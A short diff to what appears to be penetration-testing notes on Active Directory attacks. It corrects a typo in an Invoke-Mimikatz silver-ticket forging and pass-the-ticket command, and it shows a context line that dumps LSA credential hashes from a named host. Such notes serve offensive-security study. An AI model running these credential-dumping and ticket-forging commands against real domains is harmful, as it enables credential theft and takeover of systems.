@@ -8,7 +8,7 @@ Invoke-Mimikatz -Command '"lsadump::lsa /inject"' -ComputerName prod.research.se
 ```
 - Then Forge silver ticket and directly perform pass the ticket attack
 ```
-Invoke-Mimikatz -Command '"kerberos::golder /user:administrator /domain:research.security.local /target:prod.research.security.local /SID:domainSID /service:someservice(CIFS in this particular case) /rc4:hashdumpedintheformofrc4 /ptt"'
+Invoke-Mimikatz -Command '"kerberos::golden /user:administrator /domain:research.security.local /target:prod.research.security.local /SID:domainSID /service:someservice(CIFS in this particular case) /rc4:hashdumpedintheformofrc4 /ptt"'
 ```
 
 
